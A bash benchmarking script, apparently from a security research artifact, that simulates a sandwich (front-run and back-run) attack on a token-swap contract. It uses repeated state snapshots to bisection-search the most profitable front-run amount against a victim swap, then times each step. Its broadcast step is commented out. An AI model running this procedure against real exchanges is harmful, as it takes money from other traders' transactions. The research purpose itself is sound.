#!/bin/bash
set -e

source ./scripts/mev_utils.sh

CONTRACT_ADDRESS=`cat $CONTRACT_LOC/contractAddress.txt`
CODE_HASH=`cat $CONTRACT_LOC/codeHash.txt`

set_snapshot "${UNIQUE_LABEL}-start"

query_balances
echo "Token A liquidity pool: $(query_pool pool_a)"
echo "Token B liquidity pool: $(query_pool pool_b)"

# make victim tx
generate_and_sign_swap token_a 10 20 $VICTIM victim
echo "victim tx amount of token A = 10, expected return = 20"
echo

# use the nano benchmark logs to measure the loop only
#rm -f /tmp/ecall_init_nanos.log
rm -f /tmp/ecall_handle_nanos.log
rm -f /tmp/ecall_query_nanos.log
#touch /tmp/ecall_init_nanos.log
touch /tmp/ecall_query_nanos.log

_timeit() {
    start=$1
    end=$2
    scale=$3
    _time=$(bc -l <<< "scale=$scale;($end - $start)/1000000000")
    echo $_time
}

start_time=$(date +%s%N)
cnt=0
lo=0
hi=100
while [ $(expr $hi - $lo) -ne 1 ]; do
  ###
  start_loop=$(date +%s%N)
  ###
  ###
  start=$(date +%s%N)
  ###

  set_snapshot "${UNIQUE_LABEL}-${cnt}"
  ###
  end=$(date +%s%N)
  #db_restore_time=$(echo "($end - $start)/1000000" | bc)
  #db_restore_time=$(bc -l <<< "scale=5;($end - $start)/1000000000")
  db_restore_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------restore database states: $db_restore_time s"
  ###

  mid=$((($hi + $lo) / 2))
  echo "lo:$lo hi:$hi mid:$mid"

  ###
  start=$(date +%s%N)
  ###
  generate_and_sign_swap token_a $mid 0 $ADV adv
  ###
  end=$(date +%s%N)
  #sig_time=$(echo "($end - $start)/1000000" | bc)
  sig_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------generate and sign adversary transaction: $sig_time s"
  ###
  echo "adv tx token_a $mid 0"

  ###
  start=$(date +%s%N)
  ###
  simulate_tx adv
  ###
  end=$(date +%s%N)
  #sim_frontrunning_tx_time=$(echo "($end - $start)/1000000" | bc)
  sim_frontrunning_tx_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------simulate front-running transaction: $sim_frontrunning_tx_time s"
  ###
  ###
  start=$(date +%s%N)
  ###
  old_pool_a=$(query_pool pool_a)
  ###
  end=$(date +%s%N)
  #query_before_time=$(echo "($end - $start)/1000000" | bc)
  query_before_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------query the liquidity pool before simulating the victim transation: $query_before_time s"
  ###
  ###
  start=$(date +%s%N)
  ###
  simulate_tx victim
  ###
  end=$(date +%s%N)
  #sim_victim_tx_time=$(echo "($end - $start)/1000000" | bc)
  sim_victim_tx_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------simulate victim transaction: $sim_victim_tx_time s"
  ###
  ###
  start=$(date +%s%N)
  ###
  new_pool_a=$(query_pool pool_a)
  ###
  end=$(date +%s%N)
  #query_after_time=$(echo "($end - $start)/1000000" | bc)
  query_after_time=$(_timeit $start $end 5)
  #echo "-----------------------------------------------------------query the liquidity pool after simulating the victim transaction: $query_after_time s"
  ###
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo 'dif' $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))

  ###
  end_loop=$(date +%s%N)
  #bisection_search_time=$(echo "($end_loop - $start_loop)/1000000" | bc)
  bisection_search_time=$(_timeit $start $end 5)

  echo "event, time (seconds)" > stats-${cnt}.csv
  echo "bisection search single iteration,$bisection_search_time" >> stats-${cnt}.csv
  echo "restore database states,$db_restore_time" >> stats-${cnt}.csv
  echo "generate and sign adversary transaction,$sig_time" >> stats-${cnt}.csv
  echo "simulate front-running transaction,$sim_frontrunning_tx_time" >> stats-${cnt}.csv
  echo "query the liquidity pool before simulating the victim transation,$query_before_time" >> stats-${cnt}.csv
  echo "simulate victim transaction,$sim_victim_tx_time" >> stats-${cnt}.csv
  echo "query the liquidity pool after simulating the victim transaction,$query_after_time" >> stats-${cnt}.csv
  
  #rich stats-${cnt}.csv
  python3 ./scripts/mev.py stats-${cnt}.csv ${cnt}


  echo "=================================== end of a trial"
  echo
done

end_time=$(date +%s%N)

#ecall_init_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_init_nanos.log)
#ecall_init_time_millis=$( echo "$ecall_init_time_nanos / 1000000" | bc)
ecall_handle_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_handle_nanos.log)
ecall_handle_time_millis=$( echo "$ecall_handle_time_nanos / 1000000" | bc)
ecall_query_time_nanos=$(awk '{ sum += $1 } END { print sum }' /tmp/ecall_query_nanos.log)
ecall_query_time_millis=$( echo "$ecall_query_time_nanos / 1000000" | bc)
#ecalls_total_time_nanos=$( echo "$ecall_init_time_nanos + $ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_nanos=$( echo "$ecall_handle_time_nanos + $ecall_query_time_nanos" | bc)
ecalls_total_time_millis=$( echo "$ecalls_total_time_nanos / 1000000" | bc)

total_time_nanos=$(echo "$end_time - $start_time" | bc)
total_time_millis=$(echo "$total_time_nanos / 1000000" | bc)

untrusted_time_nanos=$(echo "$total_time_nanos - $ecalls_total_time_nanos" | bc)
untrusted_time_millis=$(echo "$total_time_millis - $ecalls_total_time_millis" | bc)

printf "\nTotal time spent for trial: ${total_time_nanos} nanosecs"
#printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_nanos} nanosecs"
printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_nanos} nanosecs"
printf "\nEstimated time spent for untrusted code ${untrusted_time_nanos} nanosecs\n"

printf "\nTotal time spent for trial: ${total_time_millis} millisecs"
#printf "\nEstimated time spent for (trusted) ecall_init ${ecall_init_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecall_handle ${ecall_handle_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecall_query ${ecall_query_time_millis} millisecs"
printf "\nEstimated time spent for (trusted) ecalls (handle & query) ${ecalls_total_time_millis} millisecs"
printf "\nEstimated time spent for untrusted code ${untrusted_time_millis} millisecs\n\n"

set_snapshot "${UNIQUE_LABEL}-${cnt}"
echo "final front-run tx token_a $lo 0"
old_pool_b=$(query_pool pool_b)
simulate_tx adv
new_pool_b=$(query_pool pool_b)
dif_pool_b=$(($old_pool_b - $new_pool_b))
generate_and_sign_swap token_b $dif_pool_b 0 $ADV adv_back
echo "final back-run tx token_b $dif_pool_b 0"

echo
# broadcast all 3 txs
set_snapshot "${UNIQUE_LABEL}-final"
simulate_tx adv
simulate_tx victim
simulate_tx adv_back

## broadcast all 3 txs
#reset_snapshot
#broadcast_tx adv
#broadcast_tx victim
## send back-run tx
#execute_tx token_b $dif_pool_b 0 $ADV
#query_balances

query_balances
echo "pool_a $(query_pool pool_a)"
echo "pool_b $(query_pool pool_b)"
